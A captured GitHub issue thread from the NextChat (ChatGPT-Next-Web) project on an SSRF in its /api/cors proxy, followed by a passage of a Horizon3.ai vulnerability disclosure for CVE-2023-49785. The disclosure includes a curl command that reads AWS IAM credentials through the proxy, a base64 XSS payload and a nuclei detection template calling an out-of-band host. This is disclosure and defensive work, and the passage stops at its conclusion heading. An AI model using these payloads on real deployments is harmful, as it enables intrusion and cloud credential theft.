| Regarding this code snippet, it has a potential Server-Side Request Forgery (SSRF) vulnerability because it doesn't have proper validation or restrictions in place.  [image](https://private-user-images.githubusercontent.com/17626300/312498518-3fa71d09-e715-4b79-b79f-e3cd1e63fdb7.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTAzMDMsIm5iZiI6MTczNjUxMDAwMywicGF0aCI6Ii8xNzYyNjMwMC8zMTI0OTg1MTgtM2ZhNzFkMDktZTcxNS00Yjc5LWI3OWYtZTNjZDFlNjNmZGI3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDExNTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU4YjEyZGI5YjNmNGVkNTg0YTg3M2Q4N2NhN2IzY2I5NjFkYWM3OTFmMzYwZWIxYWE1YmM1Yjk3MDBjNGM2ODUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.UxorY4I91mtMuYpSaxWEZAu6ZxHdwY5lxo-lm3orptY)  It's crucial to implement input validation and sanitization to prevent SSRF attacks, which can lead to unauthorized access to internal systems or other security risks. |
| --- |

All reactions

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=80&v=4)](/fred-bf)

Copy link

Contributor

### **[fred-bf](/fred-bf)** commented [Mar 13, 2024](#issuecomment-1994555995)

| Here are few options to to alleviate this issue:   1. As [@H0llyW00dzZ](https://github.com/H0llyW00dzZ) said to add allow list to proxy service, we can add few default built in endpoint 2. Require user to set up authentication code for accessing CORS api, this will have a greater impact on existing deployment users |
| --- |

All reactions

Sorry, something went wrong.

[![@Yidadaa](https://avatars.githubusercontent.com/u/16968934?s=80&u=c98e4b11a628e0d18b7774d62dd5c5da9b9dedd3&v=4)](/Yidadaa)

Copy link

Collaborator

### **[Yidadaa](/Yidadaa)** commented [Mar 13, 2024](#issuecomment-1994558595)

| Here is a proposal to solve this issue:   1. add `ENABLE_CORS` to env vars, and set it to false by default; 2. add code validation just like `/api/openai`, if the `CODE` is set. |
| --- |

 👍
1
 jokester reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=80&u=104ae2435dc71b28482382b4ebae817e56bfc5c3&v=4)](/H0llyW00dzZ)

Copy link

Contributor

### **[H0llyW00dzZ](/H0llyW00dzZ)** commented [Mar 13, 2024](#issuecomment-1994584117)

| Here are few options to to alleviate this issue:   1. As [@H0llyW00dzZ](https://github.com/H0llyW00dzZ) said to add allow list to proxy service, we can add few default built in endpoint 2. Require user to set up authentication code for accessing CORS api, this will have a greater impact on existing deployment users  Here is a proposal to solve this issue:   1. add `ENABLE_CORS` to env vars, and set it to false by default; 2. add code validation just like `/api/openai`, if the `CODE` is set.  Additionally, it would be better to put the CORS host in an environment variable as well, so users can set their own host for CORS in different scenarios.  Example:  ``` const ENABLE_CORS = process.env.ENABLE_CORS === 'true'; const CORS_HOST = process.env.CORS_HOST || 'https://yourdomain.com';  // Validate and sanitize the CODE input const validatedCode = validateAndSanitizeCode(req.body.CODE);  // Apply CORS only if ENABLE_CORS is true if (ENABLE_CORS) {   res.setHeader('Access-Control-Allow-Origin', CORS_HOST);   // Add other CORS headers if needed }  // Use the validated code // ... ``` |
| --- |

 👍
1
 jokester reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=80&u=104ae2435dc71b28482382b4ebae817e56bfc5c3&v=4)](/H0llyW00dzZ)

Copy link

Contributor

### **[H0llyW00dzZ](/H0llyW00dzZ)** commented [Mar 13, 2024](#issuecomment-1994590140)

| [@Yidadaa](https://github.com/Yidadaa) [@fred-bf](https://github.com/fred-bf) u might implement it for patch cors SSRF, because I can't rn still working on this:  [image](https://private-user-images.githubusercontent.com/17626300/312506158-00b71326-63f7-4b72-8059-1351f66df59b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTAzMDMsIm5iZiI6MTczNjUxMDAwMywicGF0aCI6Ii8xNzYyNjMwMC8zMTI1MDYxNTgtMDBiNzEzMjYtNjNmNy00YjcyLTgwNTktMTM1MWY2NmRmNTliLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDExNTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTJiZmM2ZGFhMzE4MWIxYjU5MGMwNzE0OThlMDVlZjJlM2M1MzNhNmY4NzdhNGNjNGU1YmY1N2Y3NWU0ZTVjZTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.4T8cHrdebVQOi-HjOerP4AVtWGSNSJq97KU_PQpgXhI) |
| --- |

All reactions

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=80&v=4)](/fred-bf)

Copy link

Contributor

### **[fred-bf](/fred-bf)** commented [Mar 13, 2024](#issuecomment-1994608531)

| Here's a strategy that is likely to have the least impact:  CORS is disabled by default, and for upstash and webdav functions that rely on the CORS interface. We could implement separate interfaces and put in the /api/ path, and only endpoint parameters are accepted to avoid the problem of proxy requests |
| --- |

All reactions

Sorry, something went wrong.

[![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=80&u=104ae2435dc71b28482382b4ebae817e56bfc5c3&v=4)](/H0llyW00dzZ)

Copy link

Contributor

### **[H0llyW00dzZ](/H0llyW00dzZ)** commented [Mar 13, 2024](#issuecomment-1994718909)

| Note  Regarding this issue,  [image](https://private-user-images.githubusercontent.com/17626300/312524663-edff4d90-6843-4dfe-b504-a66b6e5fc581.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTAzMDMsIm5iZiI6MTczNjUxMDAwMywicGF0aCI6Ii8xNzYyNjMwMC8zMTI1MjQ2NjMtZWRmZjRkOTAtNjg0My00ZGZlLWI1MDQtYTY2YjZlNWZjNTgxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDExNTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTc3YTRlZThmMDY3MDQwMDYyMjZhMzAwODFmOWY5MGJlM2Q1ZTRiNDA1NzBkZjk4NTIxNDJlZjM5OWUzNDM4NjImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.4K_DdNeqdDLiwtmdYlLRmKQijQvESR71RCGxPexyIE0) [image](https://private-user-images.githubusercontent.com/17626300/312526981-545bbdbd-8dca-42ea-bd5d-8b3420e9abfa.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MTAzMDMsIm5iZiI6MTczNjUxMDAwMywicGF0aCI6Ii8xNzYyNjMwMC8zMTI1MjY5ODEtNTQ1YmJkYmQtOGRjYS00MmVhLWJkNWQtOGIzNDIwZTlhYmZhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDExNTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEzMWNmODNlMDBlZTUxZTQ3OTNlMWNmYTRmNTVhMzA1ODY5NGI5Mjc3OTIwYjdjYWVlMmU0NTZhZmViYTI4MmQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.SFe1ylNqhk5LSQ55HDdtCw94Tx18F_PPUKYj5YihMO4) after reading through it, it appears to lower the attack vector, and it won't significantly affect other deployments such as Vercel or Kubernetes. It seems to primarily affect cloud deployments that lack proper configuration or have misconfigured settings. |
| --- |

 👍
1
 jokester reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)
[fred-bf](/fred-bf)
mentioned this issue
[Mar 13, 2024](#ref-pullrequest-2184372665)

[[Bugfix] Fix CORS SSRF security issue
#4285](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285)
 Merged

3 tasks

[![@jokester](https://avatars.githubusercontent.com/u/802130?s=80&v=4)](/jokester)

Copy link

### **[jokester](/jokester)** commented [Mar 13, 2024](#issuecomment-1995094478)

| What is the worst thing one can do with SSRF?  Certainly this can be easily used for spamming or probing.  My worst imagination is in certain environments, attacker could [grab information about the server](https://cloud.google.com/appengine/docs/legacy/standard/java/accessing-instance-metadata) or even [issue cred as the server](https://cloud.google.com/compute/docs/access/authenticate-workloads) |
| --- |

 👍
1
 H0llyW00dzZ reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=80&u=104ae2435dc71b28482382b4ebae817e56bfc5c3&v=4)](/H0llyW00dzZ)

Copy link

Contributor

### **[H0llyW00dzZ](/H0llyW00dzZ)** commented [Mar 13, 2024](#issuecomment-1995185314)

| What is the worst thing one can do with SSRF?  Certainly this can be easily used for spamming or probing.  My worst imagination is in certain environments, attacker could [grab information about the server](https://cloud.google.com/appengine/docs/legacy/standard/java/accessing-instance-metadata) or even [issue cred as the server](https://cloud.google.com/compute/docs/access/authenticate-workloads)  That's why it's recommended to use containers instead of `App Engine` and run them in a more secure like Kubernetes (k8s). This approach can help mitigate potential risks associated with SSRF vulnerabilities. |
| --- |

 👍
1
 jokester reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)
[fred-bf](/fred-bf)
linked a pull request
[Mar 13, 2024](#event-12107391450)
that will
close
this issue

[[Bugfix] Fix CORS SSRF security issue
#4285](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285)
 Merged

3 tasks

[![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=40&v=4)](/fred-bf)
[fred-bf](/fred-bf)
closed this as [completed](/ChatGPTNextWeb/ChatGPT-Next-Web/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#4285](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285)
[Mar 13, 2024](#event-12107587236)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web%2Fissues%2F4283)

Assignees

No one assigned

Labels

[bug](/ChatGPTNextWeb/ChatGPT-Next-Web/labels/bug)
Something isn't working

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [[Bugfix] Fix CORS SSRF security issue](/ChatGPTNextWeb/ChatGPT-Next-Web/pull/4285)
 [fred-bf/ChatGPT-Next-Web](/fred-bf/ChatGPT-Next-Web)

6 participants

[![@jokester](https://avatars.githubusercontent.com/u/802130?s=52&v=4)](/jokester) [![@Yidadaa](https://avatars.githubusercontent.com/u/16968934?s=52&v=4)](/Yidadaa) [![@H0llyW00dzZ](https://avatars.githubusercontent.com/u/17626300?s=52&v=4)](/H0llyW00dzZ) [![@Issues-translate-bot](https://avatars.githubusercontent.com/u/74373520?s=52&v=4)](/Issues-translate-bot) [![@006lp](https://avatars.githubusercontent.com/u/144674902?s=52&v=4)](/006lp) [![@fred-bf](https://avatars.githubusercontent.com/u/157469842?s=52&v=4)](/fred-bf)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.horizon3.ai_1663e520_20250110_115326.html ===


[Skip to main content](#brx-content)
[Skip to footer](#brx-footer)
[![Renmoe Library](https://www.horizon3.ai/wp-content/uploads/2024/11/Horizon3ai_Logo_Tagline_Horizontal_RGB-WhiteTxt_NoTag.png)](https://www.horizon3.ai)

* Solutions
  + Security Strategies
  + [→ Effective Security](/effectivesecurity)
  + [→ Splunk Logging](https://www.horizon3.ai/for-splunk/)
  + [→ Purple Team Culture](https://www.horizon3.ai/purple-team-culture/)
  + [→ Vulnerable ≠ Exploitable](https://www.horizon3.ai/vulnerable-not-exploitable/)
  + [NodeZero for Compliance](https://www.horizon3.ai/compliance/)
  + [→ PCI Complinace](https://www.horizon3.ai/compliance/pci-pentesting/)
  + [→ NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
  + [The NodeZero™ Platform](https://www.horizon3.ai/nodezero/)
  + [→ Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
  + [→ External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
  + [→ Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
  + [→ Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
  + [→ Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
  + [→ NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
  + [→ AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
  + [→ Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
  + [→ NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
  + [Documentation](https://docs.horizon3.ai/getting_started/)
  + Use Cases
  + [→ Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
  + [→ Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
  + [→ Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
  + [→ Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
  + [→ Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
  + [→ Large Organizations](/who-uses-nodezero#large-org)
  + [→ MSSP and MSP](https://www.horizon3.ai/partners/mssp-msp/)
  + [Who Uses NodeZero?](https://www.horizon3.ai/who-uses-nodezero/)
  + [→ ITOps and SecOps](/who-uses-nodezero#itops)
  + [→ Security Teams](/who-uses-nodezero#security-teams)
  + [→ Pentesters](/who-uses-nodezero#pentesters)
* Partners
  + [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
  + [Partners](https://www.horizon3.ai/partners/)
  + [Become A Partner](https://www.horizon3.ai/partners#become-a-partner-form)
  + [Partner Portal](https://partners.horizon3.ai/)
* Resources
  + [Resource Center](https://www.horizon3.ai/resource-center/)
  + [Attack Research](https://www.horizon3.ai/category/attack-research/)
  + [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Customer Stories](https://www.horizon3.ai/category/customer-story/)
  + [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [Credential Attacks](https://www.horizon3.ai/credentialattacks/)
  + [Log4Shell](https://www.horizon3.ai/log4shell/)
  + [Ransomware Impact](https://www.horizon3.ai/ransomware/)
  + [Glossary](https://www.horizon3.ai/resource-center/glossary/)
  + [Simplify Compliance with NodeZero: CMMC, DFARS, and NIST 800-171](https://www.horizon3.ai/intelligence/blogs/simplify-compliance-with-nodezero-cmmc-dfars-and-nist-800-171/)

    January 6, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Securing Financial Services: 5 Critical Cybersecurity Advantages of NodeZero](https://www.horizon3.ai/intelligence/infographics/securing-financial-services-5-critical-cybersecurity-advantages-of-nodezero/)

    January 3, 2025  |  [Infographics](https://www.horizon3.ai/category/intelligence/infographics/)
  + [NodeZero Insights™: Proof Over Promises in Cybersecurity](https://www.horizon3.ai/intelligence/blogs/nodezero-insights-proof-over-promises-in-cybersecurity/)

    December 17, 2024  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Uncover Kubernetes Security Weaknesses with NodeZero™](https://www.horizon3.ai/intelligence/webinars/uncover-kubernetes-security-weaknesses-with-nodezero/)

    December 13, 2024  |  [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
* Company
  + [Our Vision](https://www.horizon3.ai/horizon3-security-vision/)
  + [Meet The Team](https://www.horizon3.ai/about-us/)
  + [Join The Team](https://www.horizon3.ai/join-our-team/)
  + [Awards](https://www.horizon3.ai/category/news/awards/)
  + [Press Releases](https://www.horizon3.ai/category/news/press-release/)
  + [Contact Us](https://www.horizon3.ai/contact-us/)
  + [Upcoming Events](https://www.horizon3.ai/events/)
* [Log In](https://portal.horizon3ai.com/)
* Try NodeZero
  + [Get A Demo](https://www.horizon3.ai/contact-us/schedule-demo/)
  + [Free Trial](https://portal.horizon3ai.com/)

* Solutions
  + Security Strategies
  + [→ Effective Security](/effectivesecurity)
  + [→ Splunk Logging](https://www.horizon3.ai/for-splunk/)
  + [→ Purple Team Culture](https://www.horizon3.ai/purple-team-culture/)
  + [→ Vulnerable ≠ Exploitable](https://www.horizon3.ai/vulnerable-not-exploitable/)
  + [NodeZero for Compliance](https://www.horizon3.ai/compliance/)
  + [→ PCI Complinace](https://www.horizon3.ai/compliance/pci-pentesting/)
  + [→ NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
  + [The NodeZero™ Platform](https://www.horizon3.ai/nodezero/)
  + [→ Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
  + [→ External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
  + [→ Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
  + [→ Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
  + [→ Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
  + [→ NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
  + [→ AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
  + [→ Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
  + [→ NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
  + [Documentation](https://docs.horizon3.ai/getting_started/)
  + Use Cases
  + [→ Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
  + [→ Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
  + [→ Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
  + [→ Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
  + [→ Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
  + [→ Large Organizations](/who-uses-nodezero#large-org)
  + [→ MSSP and MSP](https://www.horizon3.ai/partners/mssp-msp/)
  + [Who Uses NodeZero?](https://www.horizon3.ai/who-uses-nodezero/)
  + [→ ITOps and SecOps](/who-uses-nodezero#itops)
  + [→ Security Teams](/who-uses-nodezero#security-teams)
  + [→ Pentesters](/who-uses-nodezero#pentesters)
* Partners
  + [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
  + [Partners](https://www.horizon3.ai/partners/)
  + [Become A Partner](https://www.horizon3.ai/partners#become-a-partner-form)
  + [Partner Portal](https://partners.horizon3.ai/)
* Resources
  + [Resource Center](https://www.horizon3.ai/resource-center/)
  + [Attack Research](https://www.horizon3.ai/category/attack-research/)
  + [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Customer Stories](https://www.horizon3.ai/category/customer-story/)
  + [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [Credential Attacks](https://www.horizon3.ai/credentialattacks/)
  + [Log4Shell](https://www.horizon3.ai/log4shell/)
  + [Ransomware Impact](https://www.horizon3.ai/ransomware/)
  + [Glossary](https://www.horizon3.ai/resource-center/glossary/)
  + [Simplify Compliance with NodeZero: CMMC, DFARS, and NIST 800-171](https://www.horizon3.ai/intelligence/blogs/simplify-compliance-with-nodezero-cmmc-dfars-and-nist-800-171/)

    January 6, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Securing Financial Services: 5 Critical Cybersecurity Advantages of NodeZero](https://www.horizon3.ai/intelligence/infographics/securing-financial-services-5-critical-cybersecurity-advantages-of-nodezero/)

    January 3, 2025  |  [Infographics](https://www.horizon3.ai/category/intelligence/infographics/)
  + [NodeZero Insights™: Proof Over Promises in Cybersecurity](https://www.horizon3.ai/intelligence/blogs/nodezero-insights-proof-over-promises-in-cybersecurity/)

    December 17, 2024  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Uncover Kubernetes Security Weaknesses with NodeZero™](https://www.horizon3.ai/intelligence/webinars/uncover-kubernetes-security-weaknesses-with-nodezero/)

    December 13, 2024  |  [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
* Company
  + [Our Vision](https://www.horizon3.ai/horizon3-security-vision/)
  + [Meet The Team](https://www.horizon3.ai/about-us/)
  + [Join The Team](https://www.horizon3.ai/join-our-team/)
  + [Awards](https://www.horizon3.ai/category/news/awards/)
  + [Press Releases](https://www.horizon3.ai/category/news/press-release/)
  + [Contact Us](https://www.horizon3.ai/contact-us/)
  + [Upcoming Events](https://www.horizon3.ai/events/)
* [Log In](https://portal.horizon3ai.com/)
* Try NodeZero
  + [Get A Demo](https://www.horizon3.ai/contact-us/schedule-demo/)
  + [Free Trial](https://portal.horizon3ai.com/)

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-06-at-11.12.26 PM-768x629.png)

# NextChat: An AI Chatbot That Lets You Talk to Anyone You Want To

Naveen Sunkavally  |  March 11, 2024  |  [Attack Blogs](https://www.horizon3.ai/category/attack-research/attack-blogs/), [Disclosures](https://www.horizon3.ai/category/attack-research/disclosures/)

With the advent of generative AI, AI chatbots are everywhere. While users can chat with large-langage models (LLMs) using a SaaS provider like OpenAI, there are [lots of standalone chatbot applications](https://github.com/JStumpp/awesome-chatbots) available for users to deploy and use too. These standalone applications generally offer a richer user interface than OpenAI, additional features such as the ability to plug in and test different models, and the ability to potentially bypass IP block restrictions.

From our research, the most widely deployed standalone Gen AI chatbot is [NextChat, a.k.a ChatGPT-Next-Web](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web). This is a GitHub project with 63K+ stars and 52K+ forks. The Shodan query  `title:NextChat,"ChatGPT Next Web"` pulls up 7500+ exposed instances, mostly in China and the US.

This application is vulnerable to a critical full-read server-side request forgery (SSRF) vulnerability, [CVE-2023-49785](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49785), that we disclosed to the vendor in November 2023. As of this writing, there is no patch for the vulnerability, and since 90+ days has passed since our original disclosure, we are now releasing full details here.

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-06-at-6.23.30 PM.png)

### CVE-2023-49785: A Super SSRF

NextChat is a Next.js-based Javascript application, and most of its functionality is implemented as client-side code.

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-06-at-11.12.26 PM.png)

There are, however, a few exposed server endpoints. One of these endpoints is at [/api/cors](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/app/api/cors/%5B...path%5D/route.ts), and it functions by design as an open proxy, allowing unauthenticated users to send arbitrary HTTP requests through it. This endpoint appears to have been added to support saving client-side chat data to WebDAV servers. The presence of this endpoint is an anti-pattern: it allows clients to bypass built in browser protections for accessing cross-domain resources by accessing them through a server-side endpoint instead.

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-06-at-11.09.54 PM.png)

For instance to access Google through this proxy, one can make the following request:

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-06-at-11.22.18 PM.png)

SSRF vulnerabilities vary considerably in terms of real-world impact. This particular SSRF is about as bad as it gets. It’s dangerous because:

* It enables access to arbitrary HTTP endpoints, including any internal endpoints
* It returns the full response from any accessed HTTP endpoints
* It supports arbitrary HTTP methods such as POST, PUT, etc by setting the `method` header. Request bodies are also passed along.
* URL query parameters can be passed along with URL encoding.
* It supports passing along an `Authorization` header in requests.

If this application is exposed on the Internet, an attacker essentially has full access to any other HTTP resources accessible in the same internal network as the application. The only limitation is passing along other headers such as `Cookie` or `Content-Type`, though there may be creative ways to inject these headers.

Here’s an example of accessing the AWS cloud metadata service to retrieve AWS access keys off an AWS EC2 instance running with IMDSv1 enabled:

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-07-at-7.39.03 PM.png)

```
sh-3.2# curl http://54.145.48.76:3000/api/cors/http/169.254.169.254/latest/meta-data/iam/security-credentials/REDACTED
{
  "Code" : "Success",
  "LastUpdated" : "2024-03-08T00:22:17Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA-REDACTED",
  "SecretAccessKey" : "C2CW-REDACTED",
  "Token" : "IQoJb3JpZ2luX2VjENH-REDACTED",
  "Expiration" : "2024-03-08T06:58:15Z"
}
```
### Reflected XSS

Almost all reflected XSS vulnerabilities are of little value to attackers. But we thought it was interesting to note that this vulnerability can be used to directly trigger an XSS *without loading another site.* This is because the `fetch` method used by the `/api/cors` endpoint also supports the `data` protocol.

For instance, the following payload:

`data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23`

will be decoded to `<script>alert(document.domain)</script>` at the server and sent back to the client, resulting in XSS:

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-07-at-8.51.50 AM.png)

### Mitigations

Our assessment of this vulnerability puts the CVE base score at [9.1](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) (critical). The vulnerability not only enables read access to internal HTTP endpoints but also write access using HTTP POST, PUT, and other methods. Attackers can also use this vulnerability to mask their source IP by forwarding malicious traffic intended for other Internet targets through these open proxies.

As of this writing, there is no patch for the vulnerability. More than 90 days has passed since our original contact.

* **Nov. 25, 2023**: Horizon3 reports security issue to [ChatGPT-Next-Web](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web) via GitHub vulnerability disclosure process
* **Nov. 26, 2023**: Vendor accepts the report
* **Dec. 6, 2023**: GitHub CNA reserves CVE-2023-49785
* **Jan. 15, 2024**: Horizon3 asks vendor for an update using the GitHub security issue. No response.
* **Mar. 7, 2024**: Horizon3 asks vendor for an update using the GitHub security issue. No response.
* **Mar. 11, 2024**: Public disclosure

We recommend that users not expose this application on the Internet. If it must be exposed to the Internet, ensure it is an isolated network with no access to any other internal resources. Beware that attackers can still use the application as an open proxy to disguise malicious traffic to other targets through it.

### Detection

The following nuclei template can be used to detect this vulnerability. The vulnerable code was introduced in Sept. 2023. The majority of instances online, including any instances using the more recent “NextChat” name, are highly likely to be vulnerable.

```
id: CVE-2023-49785

info:
  name: CVE-2023-49785
  author: nvn1729
  severity: critical
  description: Full-Read SSRF/XSS in NextChat, aka ChatGPT-Next-Web
  remediation: |
    Do not expose to the Internet
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2023-49785
  tags: cve-2023-49785,ssrf,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/cors/data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23"
      - "{{BaseURL}}/api/cors/http:%2f%2fnextchat.{{interactsh-url}}%23"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS interaction from second request
        words:
          - "dns"

      - type: dsl
        dsl:
          - 'contains(body_1, "<script>alert(document.domain)</script>") && contains(header_1, "text/html")' # XSS validation in first request
          - 'contains(header_2, "X-Interactsh-Version")' # Or got HTTP response back from Interact server

```
### Conclusion

